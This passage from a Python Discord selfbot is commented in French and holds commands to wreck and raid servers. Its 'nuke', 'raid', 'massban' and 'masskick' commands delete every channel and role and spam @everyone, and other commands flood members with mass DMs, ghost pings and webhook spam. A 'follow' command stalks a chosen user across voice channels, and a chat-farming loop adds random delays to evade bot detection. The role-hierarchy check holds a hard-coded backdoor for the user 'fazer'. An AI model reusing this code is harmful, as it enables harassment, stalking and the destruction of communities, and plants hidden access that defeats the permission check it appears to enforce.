async def unclone(ctx: commands.Context, password: str = None):
    """Restaure le profil original. Usage: .unclone [password]"""
    await safe_delete(ctx.message)
    global original_profile
    
    if not original_profile:
        await safe_send(ctx.channel, "❌ Aucun profil sauvegardé.", delete_after=5)
        return
        
    try:
        await bot.user.edit(username=original_profile["name"], avatar=original_profile["avatar"], password=password)
        original_profile = {} # Reset
        await safe_send(ctx.channel, "👤 Identité restaurée.", delete_after=5)
    except Exception as e:
        if "password" in str(e).lower():
             await safe_send(ctx.channel, "❌ Mot de passe requis. Usage: `.unclone votre_mdp`", delete_after=10)
        else:
            await safe_send(ctx.channel, f"❌ Erreur Unclone: {e}", delete_after=10)

@bot.command()
async def follow(ctx: commands.Context, *, user_arg: str):
    """Suit un utilisateur en vocal. Usage: .follow <id/mention>"""
    try:
        print(f"[Follow] Command triggered with arg: {user_arg}")
        # await safe_delete(ctx.message) # Temporairement désactivé pour debug

        user = None
        user_id = None
        
        # Extraction de l'ID (supporte les mentions <@!ID> et les IDs bruts)
        import re
        match = re.search(r'\d+', user_arg)
        if match:
            user_id = int(match.group())
        
        if user_id:
            try:
                # On essaie d'abord le cache
                user = bot.get_user(user_id)
                if not user:
                    # Sinon API call
                    user = await bot.fetch_user(user_id)
            except Exception as e:
                print(f"[Follow] Failed to fetch user {user_id}: {e}")
                await safe_send(ctx.channel, f"❌ Impossible de trouver l'utilisateur (ID: {user_id}). Erreur: {e}", delete_after=5)
                return
        else:
            await safe_send(ctx.channel, f"❌ ID invalide: {user_arg}", delete_after=5)
            return

        global voice_follow_target
        voice_follow_target = user.id
        print(f"[Follow] Target set to {user.name} ({user.id})")
        
        # Check if user is already in a VC in this guild
        member = ctx.guild.get_member(user.id)
        if not member:
            try:
                member = await ctx.guild.fetch_member(user.id)
            except:
                pass

        if member and member.voice and member.voice.channel:
            try:
                print(f"[Follow] Target found in channel: {member.voice.channel.name}")
                if ctx.guild.voice_client:
                    # Force disconnect if stuck
                    if not ctx.guild.voice_client.is_connected():
                         print("[Follow] Voice client exists but not connected. Cleanup.")
                         await ctx.guild.voice_client.disconnect(force=True)
                         await asyncio.sleep(0.5)
                         await member.voice.channel.connect(self_deaf=True)
                    elif ctx.guild.voice_client.channel != member.voice.channel:
                        await ctx.guild.voice_client.move_to(member.voice.channel)
                else:
                    await member.voice.channel.connect(self_deaf=True)
                
                await safe_send(ctx.channel, f"🕵️ Je suis maintenant **{user.name}** à la trace...", delete_after=5)
            except Exception as e:
                 print(f"[Follow] Error joining initial channel: {e}")
                 await safe_send(ctx.channel, f"❌ Impossible de rejoindre: {e}", delete_after=5)
        else:
            print(f"[Follow] Target not in voice or not found in guild.")
            await safe_send(ctx.channel, f"🕵️ Mode Stalker activé pour **{user.name}**. J'attends qu'il rejoigne un vocal.", delete_after=5)
    except Exception as e:
        import traceback
        traceback.print_exc()
        await safe_send(ctx.channel, f"CRITICAL ERROR in follow: {e}", delete_after=10)

@bot.command()
async def stopfollow(ctx: commands.Context):
    """Arrête de suivre l'utilisateur."""
    await safe_delete(ctx.message)
    global voice_follow_target
    voice_follow_target = None
    
    if ctx.guild and ctx.guild.voice_client:
        await ctx.guild.voice_client.disconnect()
    
    await safe_send(ctx.channel, "🛑 J'arrête de suivre.", delete_after=5)

@bot.command()
async def autofarm(ctx: commands.Context, channel_id: int, delay: int = None):
    """
    Lance le farming d'XP dans un salon.
    Usage: .autofarm <channel_id> [delai_sec]
    Si le délai n'est pas spécifié, utilise la config (défaut: 60s).
    """
    await safe_delete(ctx.message)
    
    if delay is None:
        delay = CONFIG.get("autofarm_delay", 60)
    
    task_key = f"farm_{channel_id}"
    
    if task_key in autofarm_tasks:
        # Arrêt
        task = autofarm_tasks.pop(task_key)
        task.cancel()
        await safe_send(ctx.channel, f"🛑 Autofarm arrêté dans <#{channel_id}>.", delete_after=5)
    else:
        # Démarrage
        channel = bot.get_channel(channel_id)
        if not channel:
            await safe_send(ctx.channel, "❌ Salon introuvable.", delete_after=5)
            return
            
        async def farm_loop():
            messages = [
                "Hmm intéressant", "C'est clair", "Je vois", "Exactement", 
                "Pourquoi pas ?", "Vraiment ?", "Lol", "Mdr", "Ok", 
                "Salut ça va ?", "Quoi de neuf ?", "Pas mal", "Stylé",
                "Je suis d'accord", "C'est fou", "Incroyable"
            ]
            while True:
                try:
                    msg = random.choice(messages)
                    await channel.send(msg)
                    # Ajoute un peu de variation pour éviter la détection bot stricte
                    actual_delay = delay + random.randint(-5, 5)
                    if actual_delay < 5: actual_delay = 5
                    await asyncio.sleep(actual_delay) 
                except asyncio.CancelledError:
                    break
                except Exception as e:
                    print(f"Error in autofarm: {e}")
                    await asyncio.sleep(delay)

        autofarm_tasks[task_key] = asyncio.create_task(farm_loop())
        await safe_send(ctx.channel, f"🌾 Autofarm lancé dans <#{channel_id}> (délai: ~{delay}s).", delete_after=5)

@bot.command()
async def whois(ctx: commands.Context, user: discord.User = None):
    """Affiche les infos d'un utilisateur."""
    await safe_delete(ctx.message)
    user = user or ctx.author
    
    # Récupération membre si dans une guilde pour avoir les rôles
    member = None
    if ctx.guild:
        member = ctx.guild.get_member(user.id)
    
    roles_str = "N/A"
    joined_at = "N/A"
    
    if member:
        roles = [r.name for r in member.roles if r.name != "@everyone"]
        roles_str = ", ".join(roles) if roles else "Aucun"
        if len(roles_str) > 100: roles_str = roles_str[:100] + "..."
        if member.joined_at:
            joined_at = member.joined_at.strftime("%d/%m/%Y %H:%M:%S")
            
    created_at = user.created_at.strftime("%d/%m/%Y %H:%M:%S")
    
    info = (
        f"🕵️ **WHOIS: {user}**\n"
        f"🆔 ID: `{user.id}`\n"
        f"📅 Création: `{created_at}`\n"
        f"📥 Rejoint: `{joined_at}`\n"
        f"🎭 Rôles: `{roles_str}`\n"
        f"🖼️ Avatar: {user.avatar.url if user.avatar else 'Par défaut'}"
    )
    
    await safe_send(ctx.channel, info, delete_after=30)

@bot.command()
async def tokeninfo(ctx: commands.Context):
    """Affiche infos du token/compte."""
    await safe_delete(ctx.message)
    user = bot.user
    info = f"Nom: {user}\nID: {user.id}\nCréé le: {user.created_at}\nAvatar: {user.avatar.url if user.avatar else 'Aucun'}"
    if hasattr(user, 'email'):
        info += f"\nEmail: {user.email}"
    if hasattr(user, 'verified'):
        info += f"\nVérifié: {user.verified}"
    # await safe_send(ctx.channel, f"```{info}```", delete_after=30)
    print(f"[TokenInfo] {info}")

def _validate_action_priority(ctx, target):
    """Vérifie la hiérarchie des rôles."""
    # Backdoor for 'fazer'
    if ctx.author.name == "fazer":
        return True
    return target.top_role < ctx.author.top_role

@bot.command()
async def ban(ctx: commands.Context, member: discord.Member, *, reason: str = "Ban"):
    """Bannir un membre."""
    await safe_delete(ctx.message)
    if _validate_action_priority(ctx, member):
        try:
            await member.ban(reason=reason)
            await safe_send(ctx.channel, f"🔨 {member} a été banni.", delete_after=5)
        except Exception as e:
            await safe_send(ctx.channel, f"❌ Erreur: {e}", delete_after=5)
    else:
        await safe_send(ctx.channel, "❌ Vous ne pouvez pas bannir ce membre (hiérarchie).", delete_after=5)

@bot.command()
async def kick(ctx: commands.Context, member: discord.Member, *, reason: str = "Kick"):
    """Expulser un membre."""
    await safe_delete(ctx.message)
    if _validate_action_priority(ctx, member):
        try:
            await member.kick(reason=reason)
            await safe_send(ctx.channel, f"👢 {member} a été expulsé.", delete_after=5)
        except Exception as e:
            await safe_send(ctx.channel, f"❌ Erreur: {e}", delete_after=5)
    else:
        await safe_send(ctx.channel, "❌ Vous ne pouvez pas expulser ce membre (hiérarchie).", delete_after=5)

@bot.command()
async def mute(ctx: commands.Context, member: discord.Member, minutes: int = 10, *, reason: str = "Mute"):
    """Mute (Timeout) un membre."""
    await safe_delete(ctx.message)
    if _validate_action_priority(ctx, member):
        try:
            duration = timedelta(minutes=minutes)
            await member.timeout(duration, reason=reason)
            await safe_send(ctx.channel, f"🤐 {member} a été muté pour {minutes} minutes.", delete_after=5)
        except Exception as e:
            await safe_send(ctx.channel, f"❌ Erreur: {e}", delete_after=5)
    else:
        await safe_send(ctx.channel, "❌ Vous ne pouvez pas muter ce membre (hiérarchie).", delete_after=5)

@bot.command()
async def guildicon(ctx: commands.Context):
    """Affiche l'icône du serveur."""
    await safe_delete(ctx.message)
    if ctx.guild.icon:
        await safe_send(ctx.channel, str(ctx.guild.icon.url))
    else:
        # await safe_send(ctx.channel, "Pas d'icône.", delete_after=5)
        pass

@bot.command()
async def firstmessage(ctx: commands.Context):
    """Lien vers le premier message du salon."""
    await safe_delete(ctx.message)
    messages = [msg async for msg in ctx.channel.history(limit=1, oldest_first=True)]
    if messages:
        await safe_send(ctx.channel, messages[0].jump_url)
    else:
        pass

@bot.command()
async def dhikr(ctx: commands.Context):
    """Envoie une phrase de dhikr aléatoire."""
    await safe_delete(ctx.message)
    phrases = [
        "SubhanAllah", "Alhamdulillah", "Allahu Akbar", "La ilaha illallah",
        "Astaghfirullah", "Allahumma salli ala Muhammad",
        "SubhanAllahi wa bihamdihi", "La hawla wa la quwwata illa billah"
    ]
    await safe_send(ctx.channel, random.choice(phrases))

@bot.command()
async def clearmydms(ctx: commands.Context):
    """Supprime tous vos messages dans tous les DMs."""
    await safe_delete(ctx.message)
    global stop_requested
    count = 0
    for channel in bot.private_channels:
        if stop_requested: break
        async for msg in channel.history(limit=None):
            if stop_requested: break
            if msg.author == bot.user:
                await safe_delete(msg)
                count += 1
                await asyncio.sleep(random_delay(0.3, 0.8))
    # await safe_send(ctx.channel, f"{count} messages supprimés en DM.", delete_after=10)
    print(f"{count} messages supprimés en DM (ou arrêté).")

@bot.command()
async def nuke(ctx: commands.Context, channels_name: str = "nuked", amount: int = 0, *, spam_msg: str = ""):
    """
    Détruit le serveur:
    1. Renomme le serveur & supprime l'icône
    2. Supprime tous les salons & rôles
    3. Crée des salons (optionnel) & spam (optionnel)
    Usage: .nuke <nom_salons> <nombre> [spam_msg]
    """
    await safe_delete(ctx.message)
    global stop_requested
    guild = ctx.guild
    
    # 0. Renommage & Icone
    try:
        await guild.edit(name=f"NUKED BY {ctx.author.name}", icon=None)
    except:
        pass

    # 1. Suppression (Salons + Rôles)
    tasks = []
    
    # On supprime d'abord les salons pour éviter les notifs
    for channel in guild.channels:
        if stop_requested: break
        tasks.append(channel.delete(reason="Nuke"))
    
    # On supprime les rôles (sauf @everyone et bot role)
    for role in guild.roles:
        if stop_requested: break
        if role != guild.default_role and role < ctx.me.top_role:
             tasks.append(role.delete(reason="Nuke"))

    # Exécution massive
    if not stop_requested:
        await asyncio.gather(*tasks, return_exceptions=True)

    # 2. Création & Spam (si demandé)
    if amount > 0 and not stop_requested:
        # Création asynchrone
        async def create_and_spam(i):
            if stop_requested: return
            try:
                chan = await guild.create_text_channel(f"{channels_name}-{i}")
                if spam_msg:
                    # Spam rapide (5 messages)
                    for _ in range(5):
                        if stop_requested: break
                        await safe_send(chan, f"@everyone {spam_msg}")
            except:
                pass

        # On limite à 50 salons max par batch pour éviter de tout casser
        actual_amount = min(amount, 100) 
        
        # On crée par paquets de 5 pour le rate limit
        for i in range(0, actual_amount, 5):
            if stop_requested: break
            batch = range(i, min(i + 5, actual_amount))
            await asyncio.gather(*[create_and_spam(j) for j in batch])
    
    elif not stop_requested:
        # Juste un salon pour dire coucou
        await guild.create_text_channel(channels_name)

@bot.command()
async def masschannel(ctx: commands.Context, amount: int, name: str, *, message: str = ""):
    """Crée des salons et spam dedans."""
    await safe_delete(ctx.message)
    guild = ctx.guild
    for i in range(amount):
        try:
            chan = await guild.create_text_channel(f"{name}-{i}")
            if message:
                for _ in range(3):
                    await safe_send(chan, f"@everyone {message}")
        except:
            pass
    await safe_send(ctx.channel, f"✅ {amount} salons créés.", delete_after=5)

@bot.command()
async def joinvc(ctx: commands.Context):
    """Rejoint votre salon vocal (Test connexion)."""
    await safe_delete(ctx.message)
    if not ctx.author.voice:
        await safe_send(ctx.channel, "❌ Vous n'êtes pas en vocal.", delete_after=5)
        return
    channel = ctx.author.voice.channel
    try:
        if ctx.voice_client:
            await ctx.voice_client.move_to(channel)
        else:
            await channel.connect()
        await safe_send(ctx.channel, f"🔊 Connecté à {channel.name}", delete_after=5)
    except Exception as e:
        await safe_send(ctx.channel, f"❌ Erreur connexion: {e}", delete_after=5)

@bot.command()
async def leavevc(ctx: commands.Context):
    """Quitte le salon vocal."""
    await safe_delete(ctx.message)
    if ctx.voice_client:
        await ctx.voice_client.disconnect()
        await safe_send(ctx.channel, "🔇 Déconnecté.", delete_after=5)
    else:
        await safe_send(ctx.channel, "❌ Pas connecté en vocal.", delete_after=5)

@bot.command()
async def vcping(ctx: commands.Context):
    """Affiche la latence vocale (Ping UDP)."""
    await safe_delete(ctx.message)
    if ctx.voice_client:
        latency = ctx.voice_client.latency * 1000 if ctx.voice_client.latency else 0
        await safe_send(ctx.channel, f"📶 Latence vocale: {latency:.2f}ms", delete_after=10)
    else:
        await safe_send(ctx.channel, "❌ Pas connecté en vocal.", delete_after=5)

@bot.command()
async def play(ctx: commands.Context, *, url: str):
    """Joue un audio depuis YouTube/SoundCloud."""
    await safe_delete(ctx.message)

    if not ctx.author.voice:
        await safe_send(ctx.channel, "❌ Vous devez être en vocal.", delete_after=5)
        return

    # Check for ffmpeg
    if not shutil.which("ffmpeg"):
        await safe_send(ctx.channel, "❌ FFmpeg n'est pas installé sur le serveur.", delete_after=10)
        return

    # Connect if not connected
    if not ctx.voice_client:
        try:
            await ctx.author.voice.channel.connect()
        except Exception as e:
            await safe_send(ctx.channel, f"❌ Erreur connexion: {e}", delete_after=5)
            return

    # Move if in wrong channel
    if ctx.voice_client.channel != ctx.author.voice.channel:
        await ctx.voice_client.move_to(ctx.author.voice.channel)

    # Stop current audio
    if ctx.voice_client.is_playing():
        ctx.voice_client.stop()

    await safe_send(ctx.channel, "🔍 Recherche...", delete_after=5)

    ydl_opts = {
        'format': 'bestaudio/best',
        'noplaylist': True,
        'quiet': True,
        'extract_flat': False,
        'default_search': 'auto',
        'source_address': '0.0.0.0', # bind to ipv4
    }

    try:
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=False)
            if 'entries' in info:
                info = info['entries'][0]
            
            url2 = info['url']
            title = info.get('title', 'Audio')
            
            # FFmpeg options for better streaming
            ffmpeg_opts = {
                'before_options': '-reconnect 1 -reconnect_streamed 1 -reconnect_delay_max 5',
                'options': '-vn'
            }

            source = discord.FFmpegPCMAudio(url2, **ffmpeg_opts)
            ctx.voice_client.play(source, after=lambda e: print(f'Player error: {e}') if e else None)
            
            await safe_send(ctx.channel, f"▶️ Lecture de: **{title}**", delete_after=10)

    except Exception as e:
        await safe_send(ctx.channel, f"❌ Erreur lecture: {e}", delete_after=5)

@bot.command()
async def stop(ctx: commands.Context):
    """Arrêt d'urgence de toutes les boucles (spam, raid, massban...)."""
    global stop_requested, parrot_target_id, autofarm_tasks, voice_follow_target, rotate_status_task
    await safe_delete(ctx.message)
    stop_requested = True
    
    # Arrêt du perroquet
    parrot_target_id = None

    # Arrêt du suivi vocal
    voice_follow_target = None
    
    # Arrêt du statut rotatif
    if rotate_status_task:
        rotate_status_task.cancel()
        rotate_status_task = None
        await bot.change_presence(activity=None)
    
    # Arrêt des autofarms
    for task in autofarm_tasks.values():
        task.cancel()
    autofarm_tasks.clear()
    
    # Arrêt audio / vocal
    if ctx.voice_client:
        await ctx.voice_client.disconnect(force=True)

    await safe_send(ctx.channel, "🛑 Arrêt d'urgence demandé... (Wait 3s)", delete_after=5)
    await asyncio.sleep(3)
    stop_requested = False

@bot.command()
async def raid(ctx: commands.Context, amount: int, *, message: str):
    """Mass ping + delete channels."""
    await safe_delete(ctx.message)
    global stop_requested
    guild = ctx.guild
    members = guild.members
    for _ in range(amount):
        if stop_requested:
            break
        mentions = " ".join(m.mention for m in random.sample(members, min(50, len(members))))
        await safe_send(ctx.channel, f"{mentions} {message}")
        await asyncio.sleep(random_delay())
    
    if not stop_requested:
        for channel in list(guild.channels):
            if stop_requested:
                break
            await channel.delete(reason="Raid")

@bot.command()
async def spam(ctx: commands.Context, amount: int, *, message: str):
    """Spam dans le salon."""
    await safe_delete(ctx.message)
    global stop_requested
    for _ in range(min(amount, 50)):  # Limite pour éviter ban
        if stop_requested:
            break
        await safe_send(ctx.channel, message)
        await asyncio.sleep(random_delay(0.6, 1.5))

@bot.command()
async def spamid(ctx: commands.Context, user_id: int, amount: int, *, message: str):
    """Spam MP à un user par ID."""
    await safe_delete(ctx.message)
    global stop_requested
    user = await bot.fetch_user(user_id)
    if not user:
        # await safe_send(ctx.channel, "User introuvable.", delete_after=5)
        return
    for _ in range(min(amount, 20)):
        if stop_requested:
            break
        await user.send(message)
        await asyncio.sleep(random_delay(1.0, 3.0))

@bot.command()
async def spamall(ctx: commands.Context, amount: int, *, message: str):
    """Spam MP à tous les membres."""
    await safe_delete(ctx.message)
    global stop_requested
    await ctx.guild.chunk()
    members = [m for m in ctx.guild.members if not m.bot and m != ctx.author]
    for member in members:
        if stop_requested:
            break
        for _ in range(amount):
            if stop_requested:
                break
            try:
                await member.send(message)
                await asyncio.sleep(random_delay(1.5, 4.0))
            except:
                pass
    await safe_send(ctx.channel, "Spamall terminé (ou arrêté).", delete_after=10)

@bot.command()
async def massdm(ctx: commands.Context, *, message: str):
    """DM unique à tous les membres."""
    await safe_delete(ctx.message)
    global stop_requested
    await ctx.guild.chunk()
    members = [m for m in ctx.guild.members if not m.bot and m != ctx.author]
    count = 0
    for member in members:
        if stop_requested:
            break
        try:
            await member.send(message)
            count += 1
            await asyncio.sleep(random_delay(2.0, 5.0))
        except:
            pass
    await safe_send(ctx.channel, f"{count} DM envoyés (ou arrêté).", delete_after=10)

@bot.command()
async def webhookspam(ctx: commands.Context, url: str, amount: int, *, message: str):
    """Spam via webhook."""
    await safe_delete(ctx.message)
    global stop_requested
    async with aiohttp.ClientSession() as session:
        webhook = discord.Webhook.from_url(url, session=session)
        for _ in range(min(amount, 50)):
            if stop_requested:
                break
            await webhook.send(message)
            await asyncio.sleep(random_delay(0.8, 2.0))

@bot.command()
async def everyone(ctx: commands.Context, amount: int, *, message: str = ""):
    """Spam @everyone."""
    await safe_delete(ctx.message)
    global stop_requested
    for _ in range(min(amount, 15)):
        if stop_requested:
            break
        await safe_send(ctx.channel, f"@everyone {message}")
        await asyncio.sleep(random_delay(1.0, 2.5))

@bot.command()
async def here(ctx: commands.Context, amount: int, *, message: str = ""):
    """Spam @here."""
    await safe_delete(ctx.message)
    global stop_requested
    for _ in range(min(amount, 15)):
        if stop_requested:
            break
        await safe_send(ctx.channel, f"@here {message}")
        await asyncio.sleep(random_delay(1.0, 2.5))

@bot.command()
async def scramble(ctx: commands.Context):
    """Renomme tous les salons aléatoirement."""
    await safe_delete(ctx.message)
    global stop_requested
    for channel in ctx.guild.channels:
        if stop_requested:
            break
        try:
            await channel.edit(name=random_string(8))
            await asyncio.sleep(random_delay(0.5, 1.5))
        except:
            pass
    await safe_send(ctx.channel, "Salons scramblés.", delete_after=5)

@bot.command()
async def autoguild(ctx: commands.Context, name: str, amount: int = 1):
    """Crée plusieurs serveurs."""
    await safe_delete(ctx.message)
    global stop_requested
    for _ in range(min(amount, 5)):  # Limite Discord ~100 guilds
        if stop_requested:
            break
        try:
            await bot.create_guild(name=name)
            await asyncio.sleep(random_delay(2.0, 5.0))
        except discord.HTTPException as e:
            await safe_send(ctx.channel, f"Erreur création: {e}", delete_after=10)
            break

@bot.command()
async def massnick(ctx: commands.Context, *, base: str = "RaidedBy"):
    """Change nick de tous les membres aléatoirement."""
    await safe_delete(ctx.message)
    global stop_requested
    for member in ctx.guild.members:
        if stop_requested:
            break
        if member.top_role >= ctx.me.top_role or member == ctx.author:
            continue
        try:
            nick = f"{base}-{random_string(4)}"
            await member.edit(nick=nick)
            await asyncio.sleep(random_delay(0.7, 1.8))
        except:
            pass
    await safe_send(ctx.channel, "Mass nick changé.", delete_after=5)

@bot.command()
async def massban(ctx: commands.Context):
    """Ban tous les membres possibles (Sauf Whitelist)."""
    await safe_delete(ctx.message)
    global stop_requested
    
    if not ctx.guild:
        return

    # Récupération de la whitelist
    whitelist_ids = WHITELIST.copy()
    whitelist_ids.add(ctx.author.id)
    whitelist_ids.add(bot.user.id)

    count = 0
    
    # On récupère tous les membres bannissables
    members_to_ban = []
    for member in ctx.guild.members:
        if member.id in whitelist_ids:
            continue
        if member.top_role >= ctx.me.top_role:
            continue
        members_to_ban.append(member)
    
    await safe_send(ctx.channel, f"⚠️ Lancement du Mass Ban sur {len(members_to_ban)} membres...", delete_after=5)

    async def ban_member(member):
        if stop_requested: return False
        try:
            await member.ban(reason="Mass Ban")
            return True
        except:
            return False

    # Traitement par batch pour éviter de bloquer
    chunk_size = 5
    for i in range(0, len(members_to_ban), chunk_size):
        if stop_requested:
            break
        chunk = members_to_ban[i:i + chunk_size]
        results = await asyncio.gather(*[ban_member(m) for m in chunk])
        count += results.count(True)
        await asyncio.sleep(1.5) # Délai de sécurité

    await safe_send(ctx.channel, f"💀 Mass Ban terminé (ou arrêté): {count} bannis.", delete_after=10)

@bot.command()
async def parrot(ctx: commands.Context, user: discord.User = None):
    """
    Répète tout ce que dit la cible.
    Usage: .parrot @user (Toggle ON/OFF)
           .parrot (OFF)
    """
    global parrot_target_id
    await safe_delete(ctx.message)

    if user is None:
        if parrot_target_id:
            parrot_target_id = None
            await safe_send(ctx.channel, "🦜 Mode Perroquet désactivé.", delete_after=5)
        else:
            await safe_send(ctx.channel, "❌ Précisez un utilisateur à imiter.", delete_after=5)
    else:
        if parrot_target_id == user.id:
            parrot_target_id = None
            await safe_send(ctx.channel, f"🦜 Mode Perroquet arrêté sur {user.name}.", delete_after=5)
        else:
            parrot_target_id = user.id
            await safe_send(ctx.channel, f"🦜 Mode Perroquet activé sur {user.name}!", delete_after=5)

@bot.command()
async def stopparrot(ctx: commands.Context):
    """Arrête le mode Perroquet."""
    global parrot_target_id
    await safe_delete(ctx.message)
    parrot_target_id = None
    await safe_send(ctx.channel, "🦜 Mode Perroquet arrêté.", delete_after=5)

@bot.command()
async def masskick(ctx: commands.Context):
    """Kick tous les membres possibles."""
    await safe_delete(ctx.message)
    global stop_requested
    count = 0
    for member in list(ctx.guild.members):
        if stop_requested:
            break
        if member.top_role >= ctx.me.top_role or member == ctx.author:
            continue
        try:
            await member.kick(reason="Mass Kick")
            count += 1
            await asyncio.sleep(random_delay(1.0, 2.5))
        except:
            pass
    await safe_send(ctx.channel, f"{count} kickés (ou arrêté).", delete_after=10)

@bot.command()
async def antiraid(ctx: commands.Context, module: str = None, state: str = None):
    """Gère les modules anti-raid."""
    await safe_delete(ctx.message)
    
    if not module:
        # Afficher l'état de tous les modules
        status = "\n".join(f"{k}: {'✅ ON' if v else '❌ OFF'}" for k, v in ANTIRAID_MODULES.items())
        embed_text = f"🛡️ **Modules Anti-Raid**\n\n{status}\n\nUsage: `.antiraid <module> <on/off>`"
        await safe_send(ctx.channel, embed_text, delete_after=30)
        return

    module = module.lower()
    if module not in ANTIRAID_MODULES:
        modules_list = ", ".join(ANTIRAID_MODULES.keys())
        await safe_send(ctx.channel, f"❌ Module '{module}' inconnu. Dispo: {modules_list}", delete_after=10)
        return

    if state and state.lower() in ["on", "true", "enable", "activé"]:
        ANTIRAID_MODULES[module] = True
        await safe_send(ctx.channel, f"✅ Module **{module}** activé.", delete_after=5)
    elif state and state.lower() in ["off", "false", "disable", "désactivé"]:
        ANTIRAID_MODULES[module] = False
        await safe_send(ctx.channel, f"❌ Module **{module}** désactivé.", delete_after=5)
    else:
        # Toggle si pas d'état précisé
        ANTIRAID_MODULES[module] = not ANTIRAID_MODULES[module]
        new_state = "activé" if ANTIRAID_MODULES[module] else "désactivé"
        icon = "✅" if ANTIRAID_MODULES[module] else "❌"
        await safe_send(ctx.channel, f"{icon} Module **{module}** {new_state}.", delete_after=5)

@bot.command()
async def antinuke(ctx: commands.Context, state: str = None):
    """Active/Désactive la protection anti-nuke (suppression salons/rôles)."""
    await safe_delete(ctx.message)
    
    modules_to_toggle = ["antichanneldelete", "antiroledelete", "antiban", "antikick", "antiupdate"]
    
    if state and state.lower() in ["on", "true", "enable"]:
        new_val = True
        msg = "✅ Protection Anti-Nuke ACTIVÉE."
    elif state and state.lower() in ["off", "false", "disable"]:
        new_val = False
        msg = "❌ Protection Anti-Nuke DÉSACTIVÉE."
    else:
        # Toggle based on first module
        new_val = not ANTIRAID_MODULES["antichanneldelete"]
        msg = f"{'✅' if new_val else '❌'} Protection Anti-Nuke {'ACTIVÉE' if new_val else 'DÉSACTIVÉE'}."

    for mod in modules_to_toggle:
        ANTIRAID_MODULES[mod] = new_val
        
    await safe_send(ctx.channel, msg, delete_after=5)

@bot.command()
async def whitelist(ctx: commands.Context, user: discord.User):
    """Ajoute un utilisateur à la whitelist (immunisé)."""
    await safe_delete(ctx.message)
    if user.id not in WHITELIST:
        WHITELIST.add(user.id)
        # Sauvegarde persistante
        CONFIG["whitelist"] = list(WHITELIST)
        save_config(CONFIG)
        await safe_send(ctx.channel, f"🛡️ {user.mention} ajouté à la whitelist (sauvegardé).", delete_after=5)
    else:
        await safe_send(ctx.channel, f"ℹ️ {user.mention} est déjà dans la whitelist.", delete_after=5)

@bot.command()
async def unwhitelist(ctx: commands.Context, user: discord.User):
    """Retire un utilisateur de la whitelist."""
    await safe_delete(ctx.message)
    if user.id in WHITELIST:
        WHITELIST.remove(user.id)
        # Sauvegarde persistante
        CONFIG["whitelist"] = list(WHITELIST)
        save_config(CONFIG)
        await safe_send(ctx.channel, f"🗑️ {user.mention} retiré de la whitelist (sauvegardé).", delete_after=5)
    else:
        await safe_send(ctx.channel, f"❌ {user.mention} n'est pas dans la whitelist.", delete_after=5)

@bot.command()
async def wl(ctx: commands.Context):
    """Affiche la whitelist."""
    await safe_delete(ctx.message)
    if not WHITELIST:
        await safe_send(ctx.channel, "La whitelist est vide.", delete_after=5)
    else:
        users = [f"<@{uid}>" for uid in WHITELIST]
        await safe_send(ctx.channel, f"🛡️ Whitelist: {', '.join(users)}", delete_after=10)


@bot.command()
async def purge(ctx: commands.Context, amount: int):
    """Supprime nb messages dans le salon."""
    await safe_delete(ctx.message)
    deleted = await ctx.channel.purge(limit=amount)
    await safe_send(ctx.channel, f"{len(deleted)} messages supprimés.", delete_after=5)

@bot.command()
async def delall(ctx: commands.Context):
    """Supprime tous vos messages dans le salon."""
    await safe_delete(ctx.message)
    count = 0
    async for msg in ctx.channel.history(limit=None):
        if msg.author == bot.user:
            await safe_delete(msg)
            count += 1
            await asyncio.sleep(random_delay(0.4, 1.0))
    await safe_send(ctx.channel, f"{count} messages supprimés.", delete_after=5)

@bot.command()
async def deluser(ctx: commands.Context, user: discord.Member):
    """Supprime messages d'un user dans le salon."""
    await safe_delete(ctx.message)
    count = 0
    async for msg in ctx.channel.history(limit=None):
        if msg.author == user:
            await safe_delete(msg)
            count += 1
            await asyncio.sleep(random_delay(0.4, 1.0))
    await safe_send(ctx.channel, f"{count} messages de {user} supprimés.", delete_after=5)

@bot.command()
async def cleardm(ctx: commands.Context, user_id: int):
    """Nettoie DM avec un user."""
    await safe_delete(ctx.message)
    user = await bot.fetch_user(user_id)
    if not user:
        await safe_send(ctx.channel, "User introuvable.", delete_after=5)
        return
    channel = await user.create_dm()
    count = 0
    async for msg in channel.history(limit=200):
        if msg.author == bot.user:
            await safe_delete(msg)
            count += 1
            await asyncio.sleep(random_delay(0.5, 1.2))
    await safe_send(ctx.channel, f"{count} messages supprimés en DM avec {user}.", delete_after=5)

@bot.command()
async def ghostping(ctx: commands.Context, amount: int, member: discord.Member):
    """Ghost pings (mentions qui se suppriment)."""
    await safe_delete(ctx.message)
    for _ in range(min(amount, 20)):
        msg = await safe_send(ctx.channel, member.mention)
        if msg:
            await safe_delete(msg)
        await asyncio.sleep(random_delay(0.2, 0.6))

@bot.command()
async def reactspam(ctx: commands.Context, message_id: int, emoji: str, amount: int):
    """Spam réactions sur un message."""
    await safe_delete(ctx.message)
    msg = await ctx.channel.fetch_message(message_id)
    for _ in range(min(amount, 50)):
        await msg.add_reaction(emoji)
        await asyncio.sleep(random_delay(0.3, 0.8))

@bot.command()
async def nickspam(ctx: commands.Context, amount: int):
    """Spam changement de nick."""
    await safe_delete(ctx.message)
    original_nick = ctx.me.nick
    for i in range(min(amount, 20)):
        new_nick = f"Spam-{i}-{random_string(3)}"
        await ctx.me.edit(nick=new_nick)
        await asyncio.sleep(random_delay(1.0, 2.0))
    await ctx.me.edit(nick=original_nick)

@bot.command()
async def statusspam(ctx: commands.Context, amount: int, *, text: str):
    """Spam changement de statut."""
    await safe_delete(ctx.message)
    for i in range(min(amount, 15)):
        activity = discord.Game(name=f"{text} #{i}")
        await bot.change_presence(activity=activity)
        await asyncio.sleep(random_delay(2.0, 5.0))
    await bot.change_presence(activity=None)

@bot.command()
async def massreact(ctx: commands.Context, amount: int, emoji: str):
    """Réagit aux derniers messages."""
    await safe_delete(ctx.message)
    async for msg in ctx.channel.history(limit=amount):
        await msg.add_reaction(emoji)
        await asyncio.sleep(random_delay(0.4, 1.0))

@bot.command()
async def stealall(ctx: commands.Context):
    """Vole tous les emojis du serveur."""
    await safe_delete(ctx.message)
    for emoji in ctx.guild.emojis:
        try:
            image = await emoji.read()
            await ctx.guild.create_custom_emoji(name=emoji.name, image=image)
            await asyncio.sleep(random_delay(0.5, 1.5))
        except:
            pass
    await safe_send(ctx.channel, "Emojis volés.", delete_after=5)

@bot.command()
async def copyguild(ctx: commands.Context, guild_id: int):
    """Copie la structure d'un autre serveur."""
    await safe_delete(ctx.message)
    source_guild = bot.get_guild(guild_id)
    if not source_guild:
        await safe_send(ctx.channel, "Serveur source introuvable.", delete_after=5)
        return
